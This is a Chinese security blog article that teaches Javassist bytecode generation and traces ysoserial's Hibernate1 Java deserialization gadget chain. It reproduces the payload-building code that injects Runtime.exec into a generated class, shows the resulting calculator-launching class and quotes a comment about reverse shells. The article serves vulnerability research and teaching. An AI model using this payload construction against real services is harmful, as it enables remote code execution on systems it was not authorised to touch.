
# ysoserial Java 反序列化系列第二集 Hibernate1


                                阅读量   
                                **283104**
                            
                        |
                        
                                                                                    



[![](./img/203843/t0103a36c67bd1775a3.png)](./img/203843/t0103a36c67bd1775a3.png)



## 1.Hibernate简介

Hibernate是一个开放源代码的对象关系映射框架，它对JDBC进行了非常轻量级的对象封装，它将POJO与数据库表建立映射关系，是一个全自动的orm框架，hibernate可以自动生成SQL语句，自动执行，使得Java程序员可以随心所欲的使用对象编程思维来操纵数据库。 Hibernate可以应用在任何使用JDBC的场合，既可以在Java的客户端程序使用，也可以在Servlet/JSP的Web应用中使用，最具革命意义的是，Hibernate可以在应用EJB的JaveEE架构中取代CMP，完成数据持久化的重任。



## 2.Java动态字节码生成

通过分析Hibernate1 playload 的构造过程 使用了Java的动态字节码生成的技术，这里针对该技术来提前进行一下讲解

什么是动态字节码生成，相信大家听字面意思也能大致有个概念，众所周知java是编译型语言，所有的.java文件最终都要编译成.class后缀的字节码形式。

那我们可不可以绕过.java直接操纵编译好的字节码呢？当然可以，java的反射机制就是在程序运行期去操纵字节码从而获得像方法名，属性名，构造函数，等等并对其进行操作。

当然这个只是对已经编译好的类来进行操作，我们可不可以在java运行期让程序自动生成一个.class字节码文件，其实说是生成，给我的感觉更多像是组装一个.class文件

当然也是可以的，Java为我们提供了两种方式。

**ASM** ：直接操作字节码指令，执行效率高，要是使用者掌握Java类字节码文件格式及指令，对使用者的要求比较高。

**Javassit**: 提供了更高级的API，执行效率相对较差，但无需掌握字节码指令的知识，对使用者要求较低。

javassit是一个第三方jar包我们可以通过maven以以下方式导入

```
&lt;dependency&gt;
      &lt;groupId&gt;org.javassist&lt;/groupId&gt;
      &lt;artifactId&gt;javassist&lt;/artifactId&gt;
      &lt;version&gt;3.19.0-GA&lt;/version&gt;
    &lt;/dependency&gt;
```

Javassist是一个开源的分析、编辑和创建Java字节码的类库。是由东京工业大学的数学和计算机科学系的 Shigeru Chiba （千叶 滋）所创建的。它已加入了开放源代码JBoss 应用服务器项目,通过使用Javassist对字节码操作为JBoss实现动态AOP框架。javassist是jboss的一个子项目，其主要的优点，在于简单，而且快速。直接使用java编码的形式，而不需要了解虚拟机指令，就能动态改变类的结构，或者动态生成类。

Javassist中最为重要的是ClassPool，CtClass ，CtMethod 以及 CtField这几个类。

ClassPool：一个基于HashMap实现的CtClass对象容器，其中键是类名称，值是表示该类的CtClass对象。默认的ClassPool使用与底层JVM相同的类路径，因此在某些情况下，可能需要向ClassPool添加类路径或类字节。

CtClass：表示一个类，这些CtClass对象可以从ClassPool获得。

CtMethods：表示类中的方法。

CtFields ：表示类中的字段。<br>
接下来通过代码来进行演示

```
public class JavassisTest1 {
    public static void main(String[] args) {
        ClassPool pool = ClassPool.getDefault();
        Loader loader = new Loader(pool);
        CtClass ct = pool.makeClass("JavassistTestResult");//创建类
        ct.setInterfaces(new CtClass[]{pool.makeInterface("java.io.Serializable")});//让该类实现Serializable接口
        try {
            CtField f= new CtField(CtClass.intType,"id",ct);//生成一个字段 类型为int 名字为id

            f.setModifiers(AccessFlag.PUBLIC);//将字段设置为public

            ct.addField(f);//将字段设置到类上

            CtConstructor constructor=CtNewConstructor.make("public GeneratedClass(int pId){this.id=pId;}",ct);//添加构造函数

            ct.addConstructor(constructor);

            CtMethod helloM=CtNewMethod.make("public void hello(String des){ System.out.println(des);}",ct);//添加方法

            ct.addMethod(helloM);

            ct.writeFile("/Users/IdeaProjects/Apache_ShardingSphere/Test5/target/classes/com/javassistTest/");//将生成的.class文件保存到磁盘

            Class c = loader.loadClass("JavassistTestResult");

            Constructor constructor1 = c.getDeclaredConstructor(int.class);

            Object object = constructor1.newInstance(1);

            System.out.println(1234);


        } catch (CannotCompileException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        }
    }
}
```

执行后的结果，可以看到在对应的目录下生成了我们输入的类名“JavassistTestResult”同名的class文件

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0182d69e9cdb037c65.png)

我们看一看该class文件的源码

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01bb04bb3bafd2dd4d.png)

可以看到该类的代码与我们调用javassist所示所输入的内容完全相同，该class文件就是我们通过调用javassist所提供的类与方法在运行时期动态生成的。

我们测试一下动态生成的类是否真的可用

```
public class JavassisTest3 {
    public static void main(String[] args) {
        try {
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath("/Users/IdeaProjects/Apache_ShardingSphere/Test5/target/classes/com/javassistTest");
            Loader loader = new Loader(pool);
            Class clazz = loader.loadClass("JavassistTestResult");

            Constructor constructor1 = clazz.getDeclaredConstructor(int.class);

            Object object = constructor1.newInstance(1);

            Class clazz1 = object.getClass();

            String className = clazz1.getName();

            Field field = clazz1.getField("id");

            String fieldName = field.getName();

            System.out.println("className: "+className+"n"+"fieldName: "+fieldName);
        } catch (NotFoundException | ClassNotFoundException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        }
    }
}
```

以下是执行结果，可以确定我们动态生成的类是确实可用的。

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0124da4eeaba2f3d20.png)

以上就是对javassist这个动态字节码生成技术的一些简介。



## 3.Hibernate1 源码深度解析

首先先看一下生成playload的最主要的一段代码

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0177b374fb12d8cfe0.png)

挑一些比较关键的点进行讲解，首先先看Gadgets.createTemplatesImpl()方法

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t015bfb265c768dea72.png)

以下是该方法的详细实现代码，我们来仔细观察，首先是通过TemplatesImpl.class实例化了一个TemplatesImpl对象，紧接着就是用到了我们刚才讲的动态字节码生成javassist

```
public static class StubTransletPayload extends AbstractTranslet implements Serializable {
/**此类为Gadget类的静态内部类*/
        private static final long serialVersionUID = -5971610431559700674L;


        public void transform ( DOM document, SerializationHandler[] handlers ) throws TransletException {}


        @Override
        public void transform ( DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    } 

...............

public static &lt;T&gt; T createTemplatesImpl ( final String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )
                throws Exception {
            final T templates = tplClass.newInstance();
            // use template gadget class
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
            pool.insertClassPath(new ClassClassPath(abstTranslet));
            final CtClass clazz = pool.get(StubTransletPayload.class.getName());
            // run command in static initializer
            // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
            String cmd = "java.lang.Runtime.getRuntime().exec("" +
                command.replaceAll("\\","\\\\").replaceAll(""", "\"") +
                "");";
            clazz.makeClassInitializer().insertAfter(cmd);
            /**此刻通过javassist对当前Gadget类的StubTransletPayload这个静态内部类进行了修改
             * 在修改后的字节码中加入了一个静态代码块,
             * 代码块里的内容就是通过绝对路径使用Runtime.exec来执行"open /Applications/Calculator.app" */
            // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
            clazz.setName("ysoserial.Pwner" + System.nanoTime());
            final byte[] classBytes = clazz.toBytecode();
            /**至此生成了一个以StubTransletPayload为模板切继承了AbstractTranslet类的一个class所在包为ysoserial
             * ，该类的名字为Pwner加上一个随机数，
             * 紧接着将其变为字节码*/

            // inject class bytes into instance
            Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
                classBytes, ClassFiles.classAsBytes(Foo.class)
            });

            // required to make TemplatesImpl happy
            Reflections.setFieldValue(templates, "_name", "Pwnr");
            Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
            return templates; 
            /**此时的TemplatesImpl对象里的_bytecodes属性，
             * 里面存放了两个类的字节码，一个是以实现了AbstractTranslet类的StubTransletPayload对象为模板用javassists生成的一个类对象,
             * 一个是只实现了了Serializable接口的Foo类对象，
             * 同时_tfactory属性里存放了一个TransformerFactoryImpl对象*/
        }

```

我们先看一下最终生成的.class的一个结果，这个新生成的字节码中有三个比较关键的点，首先是实现了Serializable接口，这点自不必多说，其次是继承自AbstractTranslet类，这点很关键在后续执行恶意代码时起关键作用，当然最最重要的就是这个手动加入的静态代码块，我们都知道静态代码块在类被加载的时候就会执行，整个类的生命周期中就只会执行一次。所以只需要将这个动态生成的类实例化的话就会自动执行Runtime.exec()函数 。接下来的操作就是将动态生成的类转化成字节数组的形式赋值给之前已经实例化好的TemplatesImpl对象的_bytecodes属性。同时为TemplatesImpl对象的_name和_tfactory属性赋值。

```
package ysoserial;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.Serializable;

public class Pwner1587535724799618000 extends AbstractTranslet implements Serializable {
    private static final long serialVersionUID = -5971610431559700674L;

    public Pwner1587535724799618000() {
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }

    static {
        Object var1 = null;
        Runtime.getRuntime().exec("open /Applications/Calculator.app");
    }
}
```

接下来的就是一系列针对恶意代码的封装操作，不是很难，但是特别繁琐，所以我画了一个脑图来帮助大家进行理解。最终GetObject执行完成后封装出来的结果是一个HashMap对象，对 没有错，这次反序列化的触发点，就是我们最常用的HashMap。HashMap在被序列化然后反序列化的过程中，经过一系列的嵌套调用最终触发了我们封存在TemplatesImpl对象的_bytecodes属性中的那个动态生成类的静态代块。

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01ed2a72db03277bf6.png)

首先通过脑图观察最后返回的HashMap有两个属性被赋了值，size属性和table属性。而table属性里存放的是一个HashMap$Entry对象，我们都知道HashMap$Entry对象其实就是一对键值对的映射，这个映射对象的key和value存储的是同一个TypedValue对象，其实经过分析，value可以为任意值的。这个TypedValue类是存在org.hibernate.engine.spi包中的。

接下来我们进行调试分析

既然是使用jdk自带的反序列化，那么自然会调用HashMap的readObject方法

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01f8fd2237a0e31a4e.png)

这个段代码里有两个需要注意的点，首先是1128行的代码mappings变量中存储的就是我们之前为HashMap对象的size属性所赋的值。下一个需要注意的点事1153行的for循环，此处是读取出我们之前为HashMap$Entry对象里的Key和Value

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t016ad5aa8eab9f23f1.png)

然后调用HashMap.putForCreate()方法将Key和Value传递进去。 这里就牵扯到了之前生成HashMap对象时为何要为size属性赋值，如果当初没有为size属性赋值，那么此时mappings变量就会为0，导致i&lt;mappings判断失败，从而无法执行后续内容。

紧接着判断Key是否为空，Key不为空所以执行HashMap.hash()方法来处理key

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01b6bfe23a49c593ea.png)

在第351行我们调用了之前封装好的TypedValue对象的hashCode()方法

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t014520fd93e7cd6b68.png)

我们看到hashCode()方法里又调用了ValueHolder对象的getValue()方法。

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01cf396d302442669b.png)

可以看到hashcode变量的来历，是TypedValue对象被反序列化时调用initTransients方法所赋值的，里面存储的其实一个匿名内部类实例化的对象。

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01597c93a9d9f1c31c.png)

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01e63f2825e84b294c.png)

我们看一下valueInitializer变量的值.可以看到就是我们刚才所说的匿名内部类所实例化的对象。

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01a56679f6a7c06701.png)

自然而然接下来就是调用匿名内部类的initialize()方法。由于value的存储着一个TypedValue对象所以执行type.getHashCode() , 通过脑图可知type变量中存储的是一个ComponentType对象，所以调用ComponentType.getHashCode()方法并将value变量传入。

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01fc837545cdb9ebf2.png)

紧接着第242行调用getPropertyValue()方法。这里同理propertySpan是我们创建这个对象时通过反射赋的值，不能为0，如果为零则不会执行后续内容。

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01e259fd9f324b57e7.png)

第414行调用PojoComponentTuplizer.getPropertyValue()方法。由于PojoComponentTuplizer类没有该方法所以会调用其父类的getPropertyValue()方法

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t016662878db15f6b84.png)

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t010b1c2ba035a4fc86.png)

这里的gatter变量存储的就是我们之前封装好的Gatter数组根据脑图可以看到该数组里存储的是一个BasicPropertyAccessor$BasicGetter对象。所以接下来调用BasicPropertyAccessor​$BasicGetter.get()方法

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01244ebd5ade90e216.png)

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01cdb6949a96e138ae.png)

我们观察脑图中的BasicPropertyAccessor$BasicGetter里面的属性信息。可以看到method变量是我们提前赋好了值得是TemplatesImpl.getOutputProperties() 的method对象所以这里通过反射调用TemplatesImpl.getOutputProperties()方法

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t012c3fcf4463ff0d09.png)

紧接着调用newTransformer()方法

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t014d240d4c0cd65d75.png)

触发点就藏在getTransletInstance()这个回调函数中

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01dd0e1ad4f42c3817.png)

这里也说明了为什么一开始要为TemplatesImpl的_name属性赋一个值，因为如果不赋值的话，在第一个if判断处就会直接返回null

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t012e65b5d0da3f596e.png)

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0108eca9829775809f.png)

最关键的就是第380行我们通过反射实例化了_class这个Class数组对象中下标为0的Class对象，就最终触发了我们的恶意代码。

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t013b283a7129b6f0d6.png)

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t011b2eb165349a4765.png)

那这个Class数组对象中下标为0的Class对象究竟是什么？是不是我们之前封装在TemplatesImpl的_bytecode属性中的那个通过javassist动态生成的类呢？这需要我们退一步去看上一步的defineTransletClasses()方法。

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0175848882726444fd.png)

在defineTransletClasses()方法内我们看到有这么一个for循环。其中defineClass可以从byte[]还原出一个Class对象，所以当下这个操作就是将_bytecode[ ]中每一个byte[ ]都还原成Class后赋值给_class[ ]，又因为_bytecode[ ]中下标为0的byte[ ]存储的正是包含了恶意代码的动态生成的类。所以_class[0]就是其Class对象。而_class[0].newInstance就是在实例化我们存有恶意代码的类。自然就会触发其静态代码块中存放的“Runtime.getRuntime().exec(“open /Applications/Calculator.app”);”。至此ysoserial Hibernate1反序列化代码执行原理分析完毕

[![](./img/203843/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01c8aea5062c9b05d5.png)



## 4.总结

整个Hibernate1的整体流程就是，首先使用HashMap来作为一个触发点，接下来需要用到的是hibernate-core包中的TypedValue类，AbstractComponentTuplizer类，PojoComponentTuplizer类，BasicPropertyAccessor$BasicGetter类以及AbstractType类和ComponentType类。利用这类中的一些互相调用的方法，作为调用链。但是最终执行代码的是com.sun.org.apache.xalan下的TemplatesImpl，因为我们所写的恶意代码最终是存储在该类的_bytecode属性中。
